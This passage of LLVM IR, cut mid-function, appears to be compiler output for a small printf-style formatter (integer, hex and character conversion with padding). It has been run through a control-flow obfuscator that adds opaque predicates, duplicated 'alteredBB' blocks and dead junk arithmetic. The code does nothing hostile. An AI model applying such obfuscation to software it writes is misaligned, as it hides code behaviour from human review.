  br i1 %273, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %265, label %274, label %280

; <label>:274:                                    ; preds = %originalBBpart243
  %275 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %262, i32 0, i32 3
  %276 = load i8*, i8** %275, align 8
  %277 = getelementptr i8, i8* %276, i32 %264
  %278 = bitcast i8* %277 to i32*
  %279 = add i32 %264, 8
  store i32 %279, i32* %263, align 8
  br label %285

; <label>:280:                                    ; preds = %originalBBpart243
  %281 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %262, i32 0, i32 2
  %282 = load i8*, i8** %281, align 8
  %283 = bitcast i8* %282 to i32*
  %284 = getelementptr i8, i8* %282, i32 8
  store i8* %284, i8** %281, align 8
  br label %285

; <label>:285:                                    ; preds = %280, %274
  %286 = phi i32* [ %278, %274 ], [ %283, %280 ]
  %287 = load i32, i32* %286, align 4
  %288 = load i32, i32* %15, align 4
  %289 = load i32, i32* %16, align 4
  %290 = call i32 @printi(i8** %261, i32 %287, i32 10, i32 1, i32 %288, i32 %289, i32 97)
  %291 = load i32, i32* %17, align 4
  %292 = add nsw i32 %291, %290
  store i32 %292, i32* %17, align 4
  br label %491

; <label>:293:                                    ; preds = %247
  %294 = load i8*, i8** %13, align 8
  %295 = load i8, i8* %294, align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 120
  br i1 %297, label %298, label %323

; <label>:298:                                    ; preds = %293
  %299 = load i8**, i8*** %12, align 8
  %300 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %301 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 8
  %303 = icmp ule i32 %302, 40
  br i1 %303, label %304, label %310

; <label>:304:                                    ; preds = %298
  %305 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 3
  %306 = load i8*, i8** %305, align 8
  %307 = getelementptr i8, i8* %306, i32 %302
  %308 = bitcast i8* %307 to i32*
  %309 = add i32 %302, 8
  store i32 %309, i32* %301, align 8
  br label %315

; <label>:310:                                    ; preds = %298
  %311 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 2
  %312 = load i8*, i8** %311, align 8
  %313 = bitcast i8* %312 to i32*
  %314 = getelementptr i8, i8* %312, i32 8
  store i8* %314, i8** %311, align 8
  br label %315

; <label>:315:                                    ; preds = %310, %304
  %316 = phi i32* [ %308, %304 ], [ %313, %310 ]
  %317 = load i32, i32* %316, align 4
  %318 = load i32, i32* %15, align 4
  %319 = load i32, i32* %16, align 4
  %320 = call i32 @printi(i8** %299, i32 %317, i32 16, i32 0, i32 %318, i32 %319, i32 97)
  %321 = load i32, i32* %17, align 4
  %322 = add nsw i32 %321, %320
  store i32 %322, i32* %17, align 4
  br label %491

; <label>:323:                                    ; preds = %293
  %324 = load i8*, i8** %13, align 8
  %325 = load i8, i8* %324, align 1
  %326 = zext i8 %325 to i32
  %327 = icmp eq i32 %326, 88
  br i1 %327, label %328, label %369

; <label>:328:                                    ; preds = %323
  %329 = load i32, i32* @x.7
  %330 = load i32, i32* @y.8
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %328
  %337 = load i8**, i8*** %12, align 8
  %338 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %339 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %338, i32 0, i32 0
  %340 = load i32, i32* %339, align 8
  %341 = icmp ule i32 %340, 40
  %342 = load i32, i32* @x.7
  %343 = load i32, i32* @y.8
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %341, label %350, label %356

; <label>:350:                                    ; preds = %originalBBpart247
  %351 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %338, i32 0, i32 3
  %352 = load i8*, i8** %351, align 8
  %353 = getelementptr i8, i8* %352, i32 %340
  %354 = bitcast i8* %353 to i32*
  %355 = add i32 %340, 8
  store i32 %355, i32* %339, align 8
  br label %361

; <label>:356:                                    ; preds = %originalBBpart247
  %357 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %338, i32 0, i32 2
  %358 = load i8*, i8** %357, align 8
  %359 = bitcast i8* %358 to i32*
  %360 = getelementptr i8, i8* %358, i32 8
  store i8* %360, i8** %357, align 8
  br label %361

; <label>:361:                                    ; preds = %356, %350
  %362 = phi i32* [ %354, %350 ], [ %359, %356 ]
  %363 = load i32, i32* %362, align 4
  %364 = load i32, i32* %15, align 4
  %365 = load i32, i32* %16, align 4
  %366 = call i32 @printi(i8** %337, i32 %363, i32 16, i32 0, i32 %364, i32 %365, i32 65)
  %367 = load i32, i32* %17, align 4
  %368 = add nsw i32 %367, %366
  store i32 %368, i32* %17, align 4
  br label %491

; <label>:369:                                    ; preds = %323
  %370 = load i8*, i8** %13, align 8
  %371 = load i8, i8* %370, align 1
  %372 = zext i8 %371 to i32
  %373 = icmp eq i32 %372, 117
  br i1 %373, label %374, label %399

; <label>:374:                                    ; preds = %369
  %375 = load i8**, i8*** %12, align 8
  %376 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %377 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %376, i32 0, i32 0
  %378 = load i32, i32* %377, align 8
  %379 = icmp ule i32 %378, 40
  br i1 %379, label %380, label %386

; <label>:380:                                    ; preds = %374
  %381 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %376, i32 0, i32 3
  %382 = load i8*, i8** %381, align 8
  %383 = getelementptr i8, i8* %382, i32 %378
  %384 = bitcast i8* %383 to i32*
  %385 = add i32 %378, 8
  store i32 %385, i32* %377, align 8
  br label %391

; <label>:386:                                    ; preds = %374
  %387 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %376, i32 0, i32 2
  %388 = load i8*, i8** %387, align 8
  %389 = bitcast i8* %388 to i32*
  %390 = getelementptr i8, i8* %388, i32 8
  store i8* %390, i8** %387, align 8
  br label %391

; <label>:391:                                    ; preds = %386, %380
  %392 = phi i32* [ %384, %380 ], [ %389, %386 ]
  %393 = load i32, i32* %392, align 4
  %394 = load i32, i32* %15, align 4
  %395 = load i32, i32* %16, align 4
  %396 = call i32 @printi(i8** %375, i32 %393, i32 10, i32 0, i32 %394, i32 %395, i32 97)
  %397 = load i32, i32* %17, align 4
  %398 = add nsw i32 %397, %396
  store i32 %398, i32* %17, align 4
  br label %491

; <label>:399:                                    ; preds = %369
  %400 = load i8*, i8** %13, align 8
  %401 = load i8, i8* %400, align 1
  %402 = zext i8 %401 to i32
  %403 = icmp eq i32 %402, 99
  br i1 %403, label %404, label %465

; <label>:404:                                    ; preds = %399
  %405 = load i32, i32* @x.7
  %406 = load i32, i32* @y.8
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %404
  %413 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %414 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %413, i32 0, i32 0
  %415 = load i32, i32* %414, align 8
  %416 = icmp ule i32 %415, 40
  %417 = load i32, i32* @x.7
  %418 = load i32, i32* @y.8
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %416, label %425, label %447

; <label>:425:                                    ; preds = %originalBBpart251
  %426 = load i32, i32* @x.7
  %427 = load i32, i32* @y.8
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %425
  %434 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %413, i32 0, i32 3
  %435 = load i8*, i8** %434, align 8
  %436 = getelementptr i8, i8* %435, i32 %415
  %437 = bitcast i8* %436 to i32*
  %438 = add i32 %415, 8
  store i32 %438, i32* %414, align 8
  %439 = load i32, i32* @x.7
  %440 = load i32, i32* @y.8
  %441 = sub i32 %439, 1
  %442 = mul i32 %439, %441
  %443 = urem i32 %442, 2
  %444 = icmp eq i32 %443, 0
  %445 = icmp slt i32 %440, 10
  %446 = or i1 %444, %445
  br i1 %446, label %originalBBpart267, label %originalBB53alteredBB

originalBBpart267:                                ; preds = %originalBB53
  br label %452

; <label>:447:                                    ; preds = %originalBBpart251
  %448 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %413, i32 0, i32 2
  %449 = load i8*, i8** %448, align 8
  %450 = bitcast i8* %449 to i32*
  %451 = getelementptr i8, i8* %449, i32 8
  store i8* %451, i8** %448, align 8
  br label %452

; <label>:452:                                    ; preds = %447, %originalBBpart267
  %453 = phi i32* [ %437, %originalBBpart267 ], [ %450, %447 ]
  %454 = load i32, i32* %453, align 4
  %455 = trunc i32 %454 to i8
  %456 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 0
  store i8 %455, i8* %456, align 1
  %457 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 1
  store i8 0, i8* %457, align 1
  %458 = load i8**, i8*** %12, align 8
  %459 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i32 0, i32 0
  %460 = load i32, i32* %15, align 4
  %461 = load i32, i32* %16, align 4
  %462 = call i32 @prints(i8** %458, i8* %459, i32 %460, i32 %461)
  %463 = load i32, i32* %17, align 4
  %464 = add nsw i32 %463, %462
  store i32 %464, i32* %17, align 4
  br label %491

; <label>:465:                                    ; preds = %399
  br label %490

; <label>:466:                                    ; preds = %49
  br label %467

; <label>:467:                                    ; preds = %466, %67
  %468 = load i32, i32* @x.7
  %469 = load i32, i32* @y.8
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %467
  %476 = load i8**, i8*** %12, align 8
  %477 = load i8*, i8** %13, align 8
  %478 = load i8, i8* %477, align 1
  %479 = zext i8 %478 to i32
  call void @printchar(i8** %476, i32 %479)
  %480 = load i32, i32* %17, align 4
  %481 = add nsw i32 %480, 1
  store i32 %481, i32* %17, align 4
  %482 = load i32, i32* @x.7
  %483 = load i32, i32* @y.8
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBBpart283, label %originalBB69alteredBB

originalBBpart283:                                ; preds = %originalBB69
  br label %490

; <label>:490:                                    ; preds = %originalBBpart283, %465
  br label %491

; <label>:491:                                    ; preds = %490, %452, %391, %361, %315, %285, %240
  %492 = load i32, i32* @x.7
  %493 = load i32, i32* @y.8
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %491
  %500 = load i8*, i8** %13, align 8
  %501 = getelementptr inbounds i8, i8* %500, i32 1
  store i8* %501, i8** %13, align 8
  %502 = load i32, i32* @x.7
  %503 = load i32, i32* @y.8
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %28

; <label>:510:                                    ; preds = %61, %originalBBpart24
  %511 = load i8**, i8*** %12, align 8
  %512 = icmp ne i8** %511, null
  br i1 %512, label %513, label %516

; <label>:513:                                    ; preds = %510
  %514 = load i8**, i8*** %12, align 8
  %515 = load i8*, i8** %514, align 8
  store i8 0, i8* %515, align 1
  br label %516

; <label>:516:                                    ; preds = %513, %510
  %517 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %518 = bitcast %struct.__va_list_tag* %517 to i8*
  call void @llvm.va_end(i8* %518)
  %519 = load i32, i32* %17, align 4
  ret i32 %519

originalBBalteredBB:                              ; preds = %originalBB, %3
  %520 = alloca i8**, align 8
  %521 = alloca i8*, align 8
  %522 = alloca %struct.__va_list_tag*, align 8
  %523 = alloca i32, align 4
  %524 = alloca i32, align 4
  %525 = alloca i32, align 4
  %526 = alloca [2 x i8], align 1
  %527 = alloca i8*, align 8
  store i8** %0, i8*** %520, align 8
  store i8* %1, i8** %521, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %522, align 8
  store i32 0, i32* %525, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %28
  %528 = load i8*, i8** %13, align 8
  %529 = load i8, i8* %528, align 1
  %530 = zext i8 %529 to i32
  %531 = icmp ne i32 %530, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %532 = load i8*, i8** %13, align 8
  %533 = load i8, i8* %532, align 1
  %534 = zext i8 %533 to i32
  %535 = icmp eq i32 %534, 45
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %89
  %536 = load i8*, i8** %13, align 8
  %537 = getelementptr inbounds i8, i8* %536, i32 1
  store i8* %537, i8** %13, align 8
  store i32 1, i32* %16, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %125
  %538 = load i8*, i8** %13, align 8
  %539 = load i8, i8* %538, align 1
  %540 = zext i8 %539 to i32
  %541 = icmp sle i32 %540, 57
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %148
  %542 = load i32, i32* %15, align 4
  %_ = sub i32 0, %542
  %gen = add i32 %_, 10
  %_19 = shl i32 %542, 10
  %_20 = sub i32 %542, 10
  %gen21 = mul i32 %_20, 10
  %_22 = sub i32 %542, 10
  %gen23 = mul i32 %_22, 10
  %_24 = shl i32 %542, 10
  %543 = mul nsw i32 %542, 10
  store i32 %543, i32* %15, align 4
  %544 = load i8*, i8** %13, align 8
  %545 = load i8, i8* %544, align 1
  %546 = zext i8 %545 to i32
  %_25 = shl i32 %546, 48
  %_26 = shl i32 %546, 48
  %547 = sub nsw i32 %546, 48
  %548 = load i32, i32* %15, align 4
  %_27 = shl i32 %548, %547
  %_28 = shl i32 %548, %547
  %549 = add nsw i32 %548, %547
  store i32 %549, i32* %15, align 4
  br label %originalBB18

originalBB33alteredBB:                            ; preds = %originalBB33, %181
  %550 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %551 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 8
  %553 = icmp ule i32 %552, 40
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %223
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %252
  %554 = load i8**, i8*** %12, align 8
  %555 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %556 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %555, i32 0, i32 0
  %557 = load i32, i32* %556, align 8
  %558 = icmp ule i32 %557, 40
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %328
  %559 = load i8**, i8*** %12, align 8
  %560 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %561 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %560, i32 0, i32 0
  %562 = load i32, i32* %561, align 8
  %563 = icmp ule i32 %562, 40
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %404
  %564 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %565 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %564, i32 0, i32 0
  %566 = load i32, i32* %565, align 8
  %567 = icmp ule i32 %566, 40
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %425
  %568 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %413, i32 0, i32 3
  %569 = load i8*, i8** %568, align 8
  %570 = getelementptr i8, i8* %569, i32 %415
  %571 = bitcast i8* %570 to i32*
  %_54 = shl i32 %415, 8
  %_55 = sub i32 %415, 8
  %gen56 = mul i32 %_55, 8
  %_57 = sub i32 %415, 8
  %gen58 = mul i32 %_57, 8
  %_59 = sub i32 0, %415
  %gen60 = add i32 %_59, 8
  %_61 = shl i32 %415, 8
  %_62 = shl i32 %415, 8
  %_63 = sub i32 %415, 8
  %gen64 = mul i32 %_63, 8
  %_65 = shl i32 %415, 8
  %572 = add i32 %415, 8
  store i32 %572, i32* %414, align 8
  br label %originalBB53

originalBB69alteredBB:                            ; preds = %originalBB69, %467
  %573 = load i8**, i8*** %12, align 8
  %574 = load i8*, i8** %13, align 8
  %575 = load i8, i8* %574, align 1
  %576 = zext i8 %575 to i32
  call void @printchar(i8** %573, i32 %576)
  %577 = load i32, i32* %17, align 4
  %_70 = shl i32 %577, 1
  %_71 = sub i32 %577, 1
  %gen72 = mul i32 %_71, 1
  %_73 = shl i32 %577, 1
  %_74 = sub i32 0, %577
  %gen75 = add i32 %_74, 1
  %_76 = sub i32 0, %577
  %gen77 = add i32 %_76, 1
  %_78 = sub i32 %577, 1
  %gen79 = mul i32 %_78, 1
  %_80 = sub i32 0, %577
  %gen81 = add i32 %_80, 1
  %578 = add nsw i32 %577, 1
  store i32 %578, i32* %17, align 4
  br label %originalBB69

originalBB85alteredBB:                            ; preds = %originalBB85, %491
  %579 = load i8*, i8** %13, align 8
  %580 = getelementptr inbounds i8, i8* %579, i32 1
  store i8* %580, i8** %13, align 8
  br label %originalBB85
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %40, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %43

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* @x.9
  %23 = load i32, i32* @y.10
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* %11, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %11, align 4
  %32 = load i32, i32* @x.9
  %33 = load i32, i32* @y.10
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i8*, i8** %12, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %12, align 8
  br label %17

; <label>:43:                                     ; preds = %17
  %44 = load i32, i32* @x.9
  %45 = load i32, i32* @y.10
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i32, i32* %11, align 4
  %53 = load i32, i32* %7, align 4
  %54 = icmp sge i32 %52, %53
  %55 = load i32, i32* @x.9
  %56 = load i32, i32* @y.10
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %54, label %63, label %80

; <label>:63:                                     ; preds = %originalBBpart24
  %64 = load i32, i32* @x.9
  %65 = load i32, i32* @y.10
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %63
  store i32 0, i32* %7, align 4
  %72 = load i32, i32* @x.9
  %73 = load i32, i32* @y.10
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %84

; <label>:80:                                     ; preds = %originalBBpart24
  %81 = load i32, i32* %11, align 4
  %82 = load i32, i32* %7, align 4
  %83 = sub nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  br label %84

; <label>:84:                                     ; preds = %80, %originalBBpart28
  %85 = load i32, i32* %8, align 4
  %86 = and i32 %85, 2
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %84
  store i32 48, i32* %10, align 4
  br label %89

; <label>:89:                                     ; preds = %88, %84
  %90 = load i32, i32* @x.9
  %91 = load i32, i32* @y.10
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %89
  %98 = load i32, i32* @x.9
  %99 = load i32, i32* @y.10
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %106

; <label>:106:                                    ; preds = %originalBBpart212, %4
  %107 = load i32, i32* %8, align 4
  %108 = and i32 %107, 1
  %109 = icmp ne i32 %108, 0
  br i1 %109, label %123, label %110

; <label>:110:                                    ; preds = %106
  br label %111

; <label>:111:                                    ; preds = %119, %110
  %112 = load i32, i32* %7, align 4
  %113 = icmp sgt i32 %112, 0
  br i1 %113, label %114, label %122

; <label>:114:                                    ; preds = %111
  %115 = load i8**, i8*** %5, align 8
  %116 = load i32, i32* %10, align 4
  call void @printchar(i8** %115, i32 %116)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %9, align 4
  br label %119

; <label>:119:                                    ; preds = %114
  %120 = load i32, i32* %7, align 4
  %121 = add nsw i32 %120, -1
  store i32 %121, i32* %7, align 4
  br label %111

; <label>:122:                                    ; preds = %111
  br label %123

; <label>:123:                                    ; preds = %122, %106
  %124 = load i32, i32* @x.9
  %125 = load i32, i32* @y.10
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %123
  %132 = load i32, i32* @x.9
  %133 = load i32, i32* @y.10
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %140

; <label>:140:                                    ; preds = %151, %originalBBpart216
  %141 = load i8*, i8** %6, align 8
  %142 = load i8, i8* %141, align 1
  %143 = icmp ne i8 %142, 0
  br i1 %143, label %144, label %154

; <label>:144:                                    ; preds = %140
  %145 = load i8**, i8*** %5, align 8
  %146 = load i8*, i8** %6, align 8
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  call void @printchar(i8** %145, i32 %148)
  %149 = load i32, i32* %9, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %9, align 4
  br label %151

; <label>:151:                                    ; preds = %144
  %152 = load i8*, i8** %6, align 8
  %153 = getelementptr inbounds i8, i8* %152, i32 1
  store i8* %153, i8** %6, align 8
  br label %140

; <label>:154:                                    ; preds = %140
  br label %155

; <label>:155:                                    ; preds = %163, %154
  %156 = load i32, i32* %7, align 4
  %157 = icmp sgt i32 %156, 0
  br i1 %157, label %158, label %166

; <label>:158:                                    ; preds = %155
  %159 = load i8**, i8*** %5, align 8
  %160 = load i32, i32* %10, align 4
  call void @printchar(i8** %159, i32 %160)
  %161 = load i32, i32* %9, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %9, align 4
  br label %163

; <label>:163:                                    ; preds = %158
  %164 = load i32, i32* %7, align 4
  %165 = add nsw i32 %164, -1
  store i32 %165, i32* %7, align 4
  br label %155

; <label>:166:                                    ; preds = %155
  %167 = load i32, i32* %9, align 4
  ret i32 %167

originalBBalteredBB:                              ; preds = %originalBB, %21
  %168 = load i32, i32* %11, align 4
  %_ = sub i32 %168, 1
  %gen = mul i32 %_, 1
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %170 = load i32, i32* %11, align 4
  %171 = load i32, i32* %7, align 4
  %172 = icmp sge i32 %170, %171
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %63
  store i32 0, i32* %7, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %89
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %123
  br label %originalBB14
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %134

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
